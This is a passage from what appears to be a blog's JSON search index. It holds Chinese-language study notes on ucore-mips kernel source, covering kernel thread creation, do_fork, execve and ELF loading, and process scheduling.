page\u4ee3\u7801</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u521b\u5efa\u5185\u6838\u7ebf\u7a0b","title":"\u521b\u5efa\u5185\u6838\u7ebf\u7a0b","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#idle","title":"idle","text":"<p>proc_init\u51fd\u6570\u542f\u52a8\uf9ba\u521b\u5efa\u5185\u6838\u7ebf\u7a0b\u7684\u6b65\u9aa4\u3002\u9996\u5148\u5f53\u524d\u7684\u6267\ufa08\u4e0a\u4e0b\u6587\uff08\u4ecekern_init \u542f\u52a8\u81f3\u4eca\uff09\u5c31\u53ef\u4ee5\u770b\u6210\u662fuCore\u5185\u6838\u4e2d\u7684\u4e00\u4e2a\u5185\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u3002\u4e3a\u6b64\uff0cuCore\u8c03\u7528alloc_proc\u51fd\u6570\u7ed9\u5f53\u524d\u6267\ufa08\u7684\u4e0a\u4e0b\u6587\u5206\u914d\u4e00\u4e2a\u8fdb\u7a0b\u63a7\u5236\u5757\u5e76\u5728proc_init\u4e2d\u5bf9\u5b83\u8fdb\ufa08\u76f8\u5e94\u521d\u59cb\u5316\uff0c\u5c06\u5176\u6253\u9020\u6210\u7b2c0\u4e2a\u5185\u6838\u7ebf\u7a0b --idleproc\u3002</p> <pre><code>   //alloc_proc\n   proc-&gt;mm = NULL;             //\u4e0d\u9700\u8981\uff0c\u6240\u6709\u5185\u6838\u8fdb\u7a0b\u516c\u7528\u4e00\u4e2a\u9875\u8868\n   proc-&gt;cr3 = boot_cr3;        //\u5728pmm_init\u4e2d\u5206\u914d\u4e3aPADDR(boot_pgdir)\n\n   //proc_init\n   idleproc-&gt;pid = 0;\n   idleproc-&gt;state = PROC_RUNNABLE;\n   idleproc-&gt;kstack = (uintptr_t)bootstack; //\u5728entry.S\u4e2d\u8bbe\u7f6e\u7684\n   idleproc-&gt;need_resched = 1;  //\u8868\u660e\u5728kern_init\u540e\u4f1a\u5207\u6362\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#initkernel_thread--do_fork","title":"init(kernel_thread &amp; do_fork)","text":"<p>idle\u5185\u6838\u7ebf\u7a0b\u4e3b\u8981\u5de5\u4f5c\u662f\u5b8c\u6210\u5185\u6838\u4e2d\u5404\u4e2a\u5b50\u7cfb\u7edf\u7684\u521d\u59cb\u5316\uff0cidle\u4f1a\u8c03\u7528kernel_thread\u51fd\u6570\u521b\u5efa\u5185\u6838\u7ebf\u7a0binit\u3002</p> <p>kernel_thread\u7b80\u5355\u6765\u8bf4\u4e3a\u65b0\u8fdb\u7a0b\u5206\u914d\u4e86PCB\u7a7a\u95f4\uff0c\u548ckstack\u7a7a\u95f4\u3002</p> <pre><code>    //proc_init\n    int pid = kernel_thread(init_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create init_main failed.\\n\");\n    }\n    initproc = find_proc(pid);\n    set_proc_name(initproc, \"init\");\n</code></pre> <p>\u8fc7\u7a0b\uff1a</p> <ol> <li>kernel_thread\u521b\u5efa\u5185\u6838\u7ebf\u7a0b\u7684\u4e2d\u65ad\u5e27\uff0c\u91cd\u70b9\u5728\u4e8e\u5c06epc\u8bbe\u7f6e\u4e3a\u4e86kernel_thread_entry\uff0c\u4ee5\u53ca\u8bbe\u7f6ea0\u548ca1\u4e3aarg\u548cfn\u3002\u8fd8\u6709\u4e00\u70b9\u503c\u5f97\u6ce8\u610f\uff0cstatus\u7684KSU\u4e3a\u5185\u6838\u6a21\u5f0f\u3002</li> </ol> <p>\u5f53\u4eceeret\u8fd4\u56de\u540e\uff08forkrets -&gt; exception_return\uff09\uff0cCPU\u4fbf\u4f1a\u8fdb\u5165kernel_thread_entry\uff0c\u5e76\u4ee5tf\u4e2d\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u503c\u6267\u884c\u3002</p> <p>kernel_thread\u51fd\u6570\u91c7\u7528\uf9ba\u5c40\u90e8\u53d8\uf97etf\u6765\u653e\u7f6e\u4e2d\u65ad\u5e27\uff0c\u5e76\u628a\u4e2d\u65ad\u5e27\u7684\u6307\u9488\u4f20\u9012\u7ed9do_fork\u51fd\u6570\u3002</p> <p>kernel_thread\u8c03\u7528do_fork\u7684stack\u53c2\u6570\u4e3a0\u3002\u5728do_fork-&gt;copy_thread\u4ee5\u6b64\u6765\u5224\u65ad\u662f\u521b\u5efa\u5185\u6838\u7ebf\u7a0b</p> <ol> <li> <p>do_fork\u4f5c\u7528\u662f\u4ee5\u5f53\u524d\u8fdb\u7a0b\u4e3a\u7236\u8fdb\u7a0b\uff0c\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u6839\u636eclone_flags\u51b3\u5b9a\u662f\u5426\u5171\u4eabmm\u3002\u5177\u4f53\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u4e00\u4e9b\u4e8b\u60c5\uff1a</p> </li> <li> <p>\u8c03\u7528alloc_proc\u4e3a\u5b50\u8fdb\u7a0b\u5206\u914dPCB\u7a7a\u95f4</p> </li> <li> <p>\u8c03\u7528setup_kstack(proc)\u5206\u914d\u4e86\u5185\u6838\u6808\u7a7a\u95f4\uff08\u6ce8\u610f\u8fd9\u91cc\u7684kstack\u4e3a\u7a7a\u95f2\u9875\u7684\u8d77\u59cb\u5730\u5740\uff0c\u800c\u975e\u6808\u9876\uff09</p> </li> <li> <p>\u8c03\u7528copy_mm\uff0c\u6839\u636eclone_flags\u6765\u786e\u5b9a\u662f\u590d\u5236\u8fd8\u662f\u5171\u4eabmm\u3002\uff08\u53ea\u5bf9\u7528\u6237\u8fdb\u7a0b\u6709\u6548\uff0c\u5185\u6838\u7ebf\u7a0bmm\u90fd\u4e3aNULL\uff09</p> </li> <li> <p>\u8c03\u7528copy_thread\uff1a\u5c06tf\u62f7\u8d1d\u5230kstack\u7684\u6808\u9876\uff0c\u8bbe\u7f6etf\u4e2d\u7684sp\u4e3aproc-&gt;tf - 32\uff08\u8fd9\u91cc\u7684\u51cf32\u5e94\u8be5\u548c\u4e4b\u524d\u63d0\u5230\u7684MIPS\u51fd\u6570\u8c03\u7528\u89c4\u5219\u6709\u5173\uff0c\u4e0d\u7ba1\u600e\u6837\uff0csp\u662f\u4f4d\u4e8ekstack\u4e2d\u7684\uff09</p> <p>\u5c06context\u4e2d\u7684ra\u8bbe\u7f6e\u4e3aforkret</p> </li> <li> <p>\u5c06\u5b50\u8fdb\u7a0b\u63d2\u5165hash_list\u548cproc_list</p> </li> <li> <p>\u8c03\u7528wakeup_proc\u5c06\u8fdb\u7a0b\u52a0\u5165\u8c03\u5ea6\u961f\u5217</p> </li> </ol> <pre><code>int\nkernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags) {\n    struct trapframe tf;\n    memset(&amp;tf, 0, sizeof(struct trapframe));\n    tf.tf_regs.reg_r[MIPS_REG_A0] = (uint32_t)arg;\n    tf.tf_regs.reg_r[MIPS_REG_A1] = (uint32_t)fn;\n    tf.tf_regs.reg_r[MIPS_REG_V0] = 0;\n    //TODO\n    tf.tf_status = read_c0_status();\n    tf.tf_status &amp;= ~ST0_KSU;\n    tf.tf_status |= ST0_IE;\n    tf.tf_status |= ST0_EXL;\n    tf.tf_regs.reg_r[MIPS_REG_GP] = __read_reg($28);\n    tf.tf_epc = (uint32_t)kernel_thread_entry;\n    return do_fork(clone_flags | CLONE_VM, 0, &amp;tf);\n}\n\n//kern/proc/entry.S\nkernel_thread_entry:        # void kernel_thread(void)\n  addiu $sp, $sp, -16\n  jal $a1\n  nop\n  move $a0, $v0\n  la  $t0, do_exit\n  jal $t0 \n  nop\n  /* never here */\n\n//called by do_fork\nstatic void\ncopy_thread(struct proc_struct *proc, uintptr_t esp, struct trapframe *tf) {\n    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1;\n    *(proc-&gt;tf) = *tf;\n    proc-&gt;tf-&gt;tf_regs.reg_r[MIPS_REG_V0] = 0;\n    if(esp == 0) //a kernel thread\n      esp = (uintptr_t)proc-&gt;tf - 32;\n    proc-&gt;tf-&gt;tf_regs.reg_r[MIPS_REG_SP] = esp;\n    proc-&gt;context.sf_ra = (uintptr_t)forkret;\n    proc-&gt;context.sf_sp = (uintptr_t)(proc-&gt;tf) - 32;\n}\n\n// do_fork - parent process for a new child process\n//    1. call alloc_proc to allocate a proc_struct\n//    2. call setup_kstack to allocate a kernel stack for child process\n//    3. call copy_mm to dup OR share mm according clone_flag\n//    4. call copy_thread to setup tf &amp; context in proc_struct\n//    5. insert proc_struct into hash_list &amp;&amp; proc_list\n//    6. call wakup_proc to make the new child process RUNNABLE \n//    7. set the \nint\ndo_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf) {\n int ret = -E_NO_FREE_PROC;\n struct proc_struct *proc;\n if (nr_process &gt;= MAX_PROCESS) {\n     goto fork_out;\n }\n ret = -E_NO_MEM;\n //LAB4:EXERCISE2 2009010989\n if ((proc = alloc_proc()) == NULL) {\n     goto fork_out;\n }\n\n proc-&gt;parent = current;\n\n if(setup_kstack(proc)){\n     goto bad_fork_cleanup_proc;\n }\n //LAB8:EXERCISE2 2009010989 HINT:how to copy the fs in parent's proc_struct?\n if (copy_fs(clone_flags, proc) != 0) {\n     goto bad_fork_cleanup_kstack;\n }\n if (copy_mm(clone_flags, proc)){\n     goto bad_fork_cleanup_fs;\n }\n\n copy_thread(proc, (uint32_t)stack, tf);\n\n proc-&gt;pid = get_pid();\n hash_proc(proc);\n\n\n //list_add(&amp;proc_list, &amp;(proc-&gt;list_link));\n set_links(proc);\n\n wakeup_proc(proc);\n\n ret = proc-&gt;pid;\n\nfork_out:\n return ret;\n\nbad_fork_cleanup_fs:\n put_fs(proc);\nbad_fork_cleanup_kstack:\n put_kstack(proc);\nbad_fork_cleanup_proc:\n kfree(proc);\n goto fork_out;\n}\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#user_main","title":"user_main","text":"<p>\u5728init_main\u4e2d\uff0c\u521b\u5efa\u4e86user_main\u7ebf\u7a0b\u3002</p> <pre><code>// init_main - the second kernel thread used to create user_main kernel threads\nstatic int\ninit_main(void *arg) {\n    ...\n    int pid = kernel_thread(user_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create user_main failed.\\n\");\n    }\n\n    while (do_wait(0, NULL) == 0) {\n        schedule();\n    }\n\n    fs_cleanup();\n    kprintf(\"all user-mode processes have quit.\\n\");\n    ...\n}\n</code></pre> <p>kernel_thread\u4e4b\u524d\u5df2\u7ecf\u5206\u6790\u8fc7\u4e86\uff0c\u6211\u4eec\u6765\u770buser_main\u505a\u4e86\u4ec0\u4e48</p> <pre><code>// user_main - kernel thread used to exec a user program\nstatic int\nuser_main(void *arg) {\n    kprintf(\"in user main, pid: %d\\n\", current-&gt;pid);\n    KERNEL_EXECVE(sh);\n    panic(\"user_main execve failed.\\n\");\n}\n</code></pre> <p>user_main\u8c03\u7528\u4e86<code>KERNEL_EXECVE</code>\u6765\u52a0\u8f7d\u6267\u884c\u4e00\u4e2a\u7528\u6237\u7a0b\u5e8f\u3002<code>KERNEL_EXECVE</code>\u88ab\u5c55\u5f00\u4e3a\u5bf9kernel_execve\u7684\u8c03\u7528\u3002</p> <pre><code>// kernel_execve - do SYS_exec syscall to exec a user program called by user_main kernel_thread\nstatic int\nkernel_execve(const char *name, const char **argv) {\n    int argc = 0, ret;\n    while (argv[argc] != NULL) {\n        argc ++;\n    }\n    //panic(\"unimpl\");\n    asm volatile(\n      \"la $v0, %1;\\n\" /* syscall no. */\n      \"move $a0, %2;\\n\"\n      \"move $a1, %3;\\n\"\n      \"move $a2, %4;\\n\"\n      \"move $a3, %5;\\n\"\n      \"syscall;\\n\"\n      \"nop;\\n\"\n      \"move %0, $v0;\\n\"\n      : \"=r\"(ret)\n      : \"i\"(SYSCALL_BASE+SYS_exec), \"r\"(name), \"r\"(argc), \"r\"(argv), \"r\"(argc) \n      : \"a0\", \"a1\", \"a2\", \"a3\", \"v0\"\n    );\n    return ret;\n}\n</code></pre> <p>\u800ckernel_execve\u5219\u662f\u8fdb\u884c\u4e86\u4e00\u6b21\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>kernel_execve -&gt; SYSCALL -&gt; sys_exec -&gt; do_execve</p> <ol> <li> <p>\u56e0\u4e3akernel_execve\u5c31\u662f\u5728\u5185\u6838\u7ebf\u7a0b\uff0c\u6240\u4ee5\u4e4b\u540e\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4ecd\u7136\u662f\u4f7f\u7528\u4e00\u6837\u7684\u5185\u6838\u6808\u3002</p> </li> <li> <p>do_execve\u505a\u7684\u4e8b\u60c5</p> </li> </ol> <pre><code>int do_execve(const char *name, int argc, const char **argv) \n</code></pre> <ol> <li> <p>\u521b\u5efa\u5c40\u90e8\u53d8\u91cflocal_name, kargv\uff08\u4f4d\u4e8e\u4e0a\u4e0b\u6587\u7684\u5185\u6838\u6808\u4e2d\uff09\uff0c\u5c06\u53c2\u6570name, argv\u590d\u5236\u8fc7\u6765\u3002</p> <p>kernel_execve\u8c03\u7528\u65f6\u4f20\u9012\u4e86\"sh\"\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u5730\u5740\u3002\u800c\u8be5\"sh\"\u7684\u5730\u5740\u5728gdb\u8c03\u8bd5\u65f6\u663e\u793a\u4e3a0x8002_7ff0\uff0c\u800clocal_name\u7684\u5730\u5740\u5219\u4e3a0x81fe_bd20\uff08\u6b64\u65f6sp\u4e3a0x81fe_bd00\uff0c\u53ef\u4ee5\u77e5\u9053local_name\u4f4d\u4e8e\u5f53\u524d\u51fd\u6570\u7684\u6808\u5e27\u4e2d\uff0c\u800c\"sh\"\u4f4d\u4e8e\u522b\u5904\uff09</p> <pre><code>copy_string(mm, local_name, name, sizeof(local_name))\n\ncopy_kargv(mm, argc, kargv, argv)\n</code></pre> <p>copy_string\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5148\u68c0\u67e5\u8bbf\u95eesrc\u662f\u5426\u5408\u6cd5\uff08\u901a\u8fc7mm\uff09\uff0c\u7136\u540e\u5c06src\u590d\u5236\u5230dst\u4e2d\u3002\u8fd9\u91cc\u7684dst\u4f4d\u4e8e\u5185\u6838\u7a7a\u95f4</p> <pre><code>bool copy_string(struct mm_struct *mm, char *dst, const char *src, size_t maxn) \n</code></pre> <p>copy_string\u5177\u4f53\u4ee3\u7801\uff0cif\u5224\u65ad\u6709\u70b9\u590d\u6742\uff0c\u4e14\u6ca1\u6709\u6ce8\u91ca\uff0c\u6ca1\u592a\u770b\u61c2\u3002</p> </li> <li> <p>\u8bfb\u53d6\u6587\u4ef6\u7cfb\u7edf\uff0c\u83b7\u5f97\u6587\u4ef6\u53f7\uff0c\u4e4b\u540e\u4f20\u7ed9load_icode\u4f7f\u7528\u3002</p> <pre><code>fd = sysfile_open(path, O_RDONLY)\n</code></pre> </li> <li> <p>\u6e05\u7a7a\u539f\u672c\u7684mm\u3002vma\uff0c\u5206\u914d\u7684Page\uff0c\u9875\u8868\u7b49\u7b49\u90fd\u4f1a\u88ab\u6e05\u9664\u3002(user\u6b64\u65f6\u662f\u5185\u6838\u8fdb\u7a0b\uff0c\u56e0\u6b64\u6ca1\u6709mm)</p> <pre><code>  if (mm != NULL) {\n        lcr3(boot_cr3);\n        if (mm_count_dec(mm) == 0) {\n            exit_mmap(mm);\n            put_pgdir(mm);\n            mm_destroy(mm);\n        }\n        current-&gt;mm = NULL;\n    }\n</code></pre> </li> <li> <p>\u8c03\u7528load_icode</p> <pre><code>load_icode(fd, argc, kargv)\n</code></pre> <p>\u8c03\u7528\u5b8cload_icode\u540e\uff0celf\u6587\u4ef6\u5df2\u7ecf\u88ab\u5168\u90e8\u52a0\u8f7d\u8fdb\u5185\u5b58\uff0c\u5e76\u4e14\u6839\u636eelf\u6587\u4ef6program header\u7684\u5185\u5bb9\u8bbe\u7f6e\u597d\u4e86vma\uff0c\u9875\u8868\u7b49\u5185\u5bb9\u3002\u8fd8\u5206\u914d\u4e86USTACK\u7a7a\u95f4\u3002</p> </li> <li> <p>load_icode\u505a\u7684\u4e8b\u60c5</p> </li> </ol> <pre><code>// load_icode -  called by sys_exec--&gt;do_execve\n// 1. create a new mm for current process\n// 2. create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT\n// 3. copy TEXT/DATA/BSS parts in binary to memory space of process\n// 4. call mm_map to setup user stack, and put parameters into user stack\n// 5. setup trapframe for user environment   \nstatic int\nload_icode(int fd, int argc, char **kargv)\n</code></pre> <ol> <li> <p>\u521b\u5efa\u65b0\u7684mm</p> <pre><code>  struct mm_struct *mm;\n    if ((mm = mm_create()) == NULL) {\n        goto bad_mm;\n    }\n    if (setup_pgdir(mm) != 0) {\n        goto bad_pgdir_cleanup_mm;\n    }\n</code></pre> </li> <li> <p>\u63a5\u4e0b\u6765\u6d89\u53ca\u5230\u5bf9elf\u6587\u4ef6\u7684\u89e3\u6790\u3002\u9996\u5148\u8c03\u7528load_icode_read\u8bfb\u53d6elf\u5934(struct elfhdr32)\u3002\u7136\u540e\u6839\u636eelfhdr\uff0c\u83b7\u5f97\u7a0b\u5e8f\u5934(struct proghdr)\u7684\u6587\u4ef6\u5185\u504f\u79fbelf-&gt;e_phoff\u3001\u7a0b\u5e8f\u5934\u7684\u6570\u91cfelf-&gt;e_phnum\u3002\u518d\u901a\u8fc7for\u5faa\u73af\uff0c\u8bfb\u53d6\u6bcf\u4e2a\u7a0b\u5e8f\u5934ph\u3002\u7a0b\u5e8f\u5934\u663e\u793a\u4e86\u6bcf\u4e2a\u6bb5\u7684\u4fe1\u606f\u3002</p> <pre><code>for (phnum = 0; phnum &lt; elf-&gt;e_phnum; phnum ++) {\n    off_t phoff = elf-&gt;e_phoff + sizeof(struct proghdr) * phnum;\n    if ((ret = load_icode_read(fd, ph, sizeof(struct proghdr), phoff)) != 0) {\n        goto bad_cleanup_mmap;\n  }\n    ...\n</code></pre> <p>readelf -l  obj/user/sh\u7684\u4fe1\u606f</p> <pre><code>Elf \u6587\u4ef6\u7c7b\u578b\u4e3a EXEC (\u53ef\u6267\u884c\u6587\u4ef6)\nEntry point 0x100033d0\nThere are 2 program headers, starting at offset 52\n\n\u7a0b\u5e8f\u5934\uff1a\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  ABIFLAGS       0x0141d0 0x100041d0 0x100041d0 0x00018 0x00018 R   0x8\n  LOAD           0x010000 0x10000000 0x10000000 0x05010 0x09010 RWE 0x10000\n\n Section to Segment mapping:\n  \u6bb5\u8282...\n   00     .MIPS.abiflags \n   01     .text .MIPS.abiflags .data .bss\n</code></pre> </li> <li> <p>\u6839\u636e\u6bcf\u4e2aph\u7684\u4fe1\u606f\uff0c\u6dfb\u52a0vma\u3002\u8fd9\u91cc\u7528\u7684\u662fph-&gt;p_memsz\u3002</p> <pre><code>  vm_flags = 0;\n      //ptep_set_u_read(&amp;perm);\n    perm |= PTE_U;\n    if (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;\n    if (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;\n    if (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;\n    if (vm_flags &amp; VM_WRITE) perm |= PTE_W; \n\n    if ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, NULL)) != 0) {\n        goto bad_cleanup_mmap;\n    }\n</code></pre> </li> <li> <p>\u8c03\u7528pgdir_alloc_page\u4e3a\u6bcf\u4e2a\u865a\u62df\u5730\u5740\u5206\u914d\u7269\u7406\u9875\uff0c\u5e76\u6dfb\u52a0\u9875\u8868\u6620\u5c04\u3002\u8c03\u7528load_icode_read\u5c06elf\u6587\u4ef6\u5bf9\u5e94\u6bb5(segment)\u8bfb\u53d6\u5230\u5bf9\u5e94\u7684\u7269\u7406\u9875\u4e2d\u3002</p> <pre><code>    off_t offset = ph-&gt;p_offset;\n    size_t off, size;\n    uintptr_t start = ph-&gt;p_va, end, la = ROUNDDOWN_2N(start, PGSHIFT);\n\n    end = ph-&gt;p_va + ph-&gt;p_filesz;\n    while (start &lt; end) {\n        if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {\n            ret = -E_NO_MEM;\n            goto bad_cleanup_mmap;\n        }\n        off = start - la, size = PGSIZE - off, la += PGSIZE;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        if ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != 0) {\n            goto bad_cleanup_mmap;\n        }\n        start += size, offset += size;\n    }\n</code></pre> </li> <li> <p>\u8bbe\u7f6ebss\u6bb5\uff08\u731c\u6d4b\uff09</p> <pre><code>  end = ph-&gt;p_va + ph-&gt;p_memsz;\n\n    if (start &lt; la) {\n        if (start &gt;= end) {\n            continue ;\n        }\n        off = start + PGSIZE - la, size = PGSIZE - off;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        memset(page2kva(page) + off, 0, size);\n        start += size;\n        assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));\n    }\n\n    while (start &lt; end) {\n        if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {\n            ret = -E_NO_MEM;\n            goto bad_cleanup_mmap;\n        }\n        off = start - la, size = PGSIZE - off, la += PGSIZE;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        memset(page2kva(page) + off, 0, size);\n        start += size;\n    }\n</code></pre> </li> <li> <p>\u6620\u5c04\u7528\u6237\u6808\u7a7a\u95f4\uff08\u6dfb\u52a0vma\uff0c\u5f53\u53d1\u751fpagefault\u65f6\uff0c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u5206\u914d\u7269\u7406\u9875\uff09</p> <pre><code>  vm_flags = VM_READ | VM_WRITE | VM_STACK;\n    if ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) != 0) {\n        goto bad_cleanup_mmap;\n    }\n</code></pre> </li> <li> <p>\u5c06\u51fd\u6570\u8c03\u7528\u53c2\u6570\u538b\u5165\u7528\u6237\u6808\u4e2d</p> <pre><code>      uintptr_t stacktop = USTACKTOP - argc * PGSIZE;\n    char **uargv = (char **)(stacktop - argc * sizeof(char *));\n    int i;\n    for (i = 0; i &lt; argc; i ++) {\n        uargv[i] = strcpy((char *)(stacktop + i * PGSIZE), kargv[i]);\n    }\n</code></pre> <p>\u4e0a\u4e00\u4e2a\u6b65\u9aa4\u5df2\u7ecf\u5c06USTACKTOP\u6dfb\u52a0\u5230\u4e86vma\u4e2d\u3002\u56e0\u6b64\u5728\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7528\u6237\u6808\u65f6\u4f1a\u89e6\u53d1pagefault\uff08\u9875\u8868\u4e2d\u6ca1\u6709\u6620\u5c04\u5173\u7cfb\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u52a8\u6001\u5206\u914dPage\u3002\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u4f1a\u518d\u89e6\u53d1\u4e00\u6b21tlb refill\uff0ctlb\u6dfb\u52a0\u6620\u5c04\u5173\u7cfb\uff0c\u4e4b\u540e\u4fbf\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u4e86\u3002</p> </li> <li> <p>\u8bbe\u7f6etf\u3002</p> <ol> <li> <p>\u5c06tf-&gt;tf_epc\u8bbe\u7f6e\u4e3a\u4e86elf-&gt;e_entry\u3002\u56e0\u6b64\u5f02\u5e38\u8fd4\u56de\u65f6\u4fbf\u5f00\u59cb\u6267\u884celf\u7a0b\u5e8f\u3002</p> </li> <li> <p>\u5728tf-&gt;tf_status\u4e2d\u8bbe\u7f6e\u4e86KSU_USER\uff0c\u56e0\u6b64\u4eceSYSCALL\u8fd4\u56de\u540e\uff0cCPU\u4f1a\u8f6c\u53d8\u4e3a\u7528\u6237\u6001\u3002</p> </li> </ol> <pre><code>  struct trapframe *tf = current-&gt;tf;\n    memset(tf, 0, sizeof(struct trapframe));\n\n    tf-&gt;tf_epc = elf-&gt;e_entry;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_SP] = USTACKTOP;\n    uint32_t status = read_c0_status();\n    status &amp;= ~ST0_KSU;\n    status |= KSU_USER;     //\u53d8\u6210\u7528\u6237\u8fdb\u7a0b\n    status |= ST0_EXL;\n    tf-&gt;tf_status = status;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_A0] = argc;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_A1] = (uint32_t)uargv;\n</code></pre> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u8c03\u5ea6","title":"\u8c03\u5ea6","text":"<p>\u6267\u884c\u5b8cproc_init\u540e\uff0c\u5df2\u7ecf\u521b\u5efa\u597d\u4e86\u4e24\u4e2a\u5185\u6838\u7ebf\u7a0bidle\u548cinit\uff0c\u5e76\u4e14\u5f53\u524d\u6267\u884c\u7684\u7ebf\u7a0b\u4e3aproc_init\u3002\u5f53ucore\u7684\u6240\u6709\u521d\u59cb\u5316\u5de5\u4f5c\u5b8c\u6210\u540e\uff0cucore\u6267\u884ckern_init\u7684\u6700\u540e\u4e00\u4e2a\u51fd\u6570cpu_idle\u51fd\u6570\u3002cpu_idle\u4f1a\u8c03\u7528schedule\u8ba9\u51faCPU\u3002</p> <p>schedule\u5177\u4f53\u7684\u5b9e\u73b0\u6211\u4eec\u53ef\u4ee5\u4e0d\u5173\u5fc3\u3002\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053sched_class_enqueue(proc)\u5c06\u4e00\u4e2a\u8fdb\u7a0b\u653e\u5165\u8fd0\u884c\u961f\u5217run queue\u3002next = sched_class_pick_next()\u4ecerq\u4e2d\u627e\u5230\u4e0b\u4e00\u4e2a\u6267\u884c\u7684\u8fdb\u7a0b\u3002</p> <p>\u5f53\u9009\u5b9a\u9700\u8981\u6267\u884c\u7684\u8fdb\u7a0b\u540e\uff0cproc_run\u51fd\u6570\u5c06\u8be5\u8fdb\u7a0b\u8f7d\u5165CPU\u6267\u884c\u3002</p> <pre><code>void\ncpu_idle(void) {\n    while (1) {\n        if (current-&gt;need_resched) {\n            schedule();\n        }\n    }\n}\n\nvoid\nschedule(void) {\n    bool intr_flag;\n    struct proc_struct *next;\n    local_intr_save(intr_flag);\n    {\n        current-&gt;need_resched = 0;\n        if (current-&gt;state == PROC_RUNNABLE) {\n            sched_class_enqueue(current);\n        }\n        if ((next = sched_class_pick_next()) != NULL) {\n            sched_class_dequeue(next);\n        }\n        if (next == NULL) {\n            next = idleproc;\n        }\n        next-&gt;runs ++;\n        if (next != current) {\n            //kprintf(\"########################\\n\");\n            //kprintf(\"c %d TO %d\\n\", current-&gt;pid, next-&gt;pid);\n            //print_trapframe(next-&gt;tf);\n            //kprintf(\"@@@@@@@@@@@@@@@@@@@@@@@@\\n\");\n            proc_run(next);\n        }\n    }\n    local_intr_restore(intr_flag);\n}\n\nvoid\nproc_run(struct proc_struct *proc) {\n    if (proc != current) {\n        bool intr_flag;\n        struct proc_struct *prev = current, *next = proc;\n        local_intr_save(intr_flag);\n        {\n          //panic(\"unimpl\");\n            current = proc;\n            //load_sp(next-&gt;kstack + KSTACKSIZE);\n            lcr3(next-&gt;cr3);\n            tlb_invalidate_all();       //\u6807\u6ce8\u4e00\u4e0b\u8fd9\u91cc\u7684tlb\u6e05\u7a7a\uff0c\u5f85\u4f18\u5316\n            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));\n        }\n        local_intr_restore(intr_flag);\n    }\n}\n</code></pre> <p>proc_run\u4f1a\u8c03\u7528switch_to\uff0cswitch_to\u4f1a\uff1a</p> <ol> <li>\u5c06\u5f53\u524d\u7684context\u5b58\u50a8\u5728prev-&gt;context\u4e2d\u3002\uff08\u6ce8\u610f\uff0ccontext\u53ea\u5305\u542bs0-s8, sp, gp, ra\uff09</li> <li>\u6062\u590dnext-&gt;context</li> <li>\u6267\u884c<code>j ra</code></li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#init\u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b","title":"init\u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b","text":"<p>\u901a\u8fc7kernel_thread(init_main, NULL, 0)\u521b\u5efainit\u8fdb\u7a0b\u540e</p> <ol> <li> <p>cpu_idle\u4e2d\uff08idle\u8fdb\u7a0b\u4e2d\uff09\uff0c\u6267\u884cschedule()\uff0c\u6b64\u65f6\u53ea\u6709idle\u548cinit\u4e24\u4e2a\u8fdb\u7a0b\uff0c\u56e0\u6b64\u8c03\u5ea6\u5230init\u8fdb\u7a0b\u6267\u884cproc_run\u3002</p> </li> <li> 